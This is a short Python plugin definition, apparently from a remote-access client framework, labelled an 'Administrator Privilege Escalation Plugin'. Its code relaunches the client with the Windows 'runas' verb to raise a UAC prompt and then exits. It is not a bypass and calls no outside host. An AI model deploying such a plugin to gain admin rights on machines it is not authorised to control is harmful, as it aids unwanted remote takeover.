plugin_name = r"""runClientAsAdmin"""
plugin_description = r"""Administrator Privilege Escalation Plugin"""
plugin_type = r"""remote"""
plugin_source = r"""

def uac_escalation(argv=None, debug=False):
    if argv is None and Shell32.IsUserAnAdmin():
        return True
    if argv is None:
        argv = sys.argv
    if hasattr(sys, '_MEIPASS'):
        arguments = map(unicode, argv[1:])
    else:
        arguments = map(unicode, argv)
    argument_line = u' '.join(arguments)
    executable = unicode(sys.executable)
    ret = Shell32.ShellExecuteW(None, u"runas", executable, argument_line, None, 1)
    if int(ret) <= 32:
        return False
    return None

uac_escalation()
os._exit(1)"""
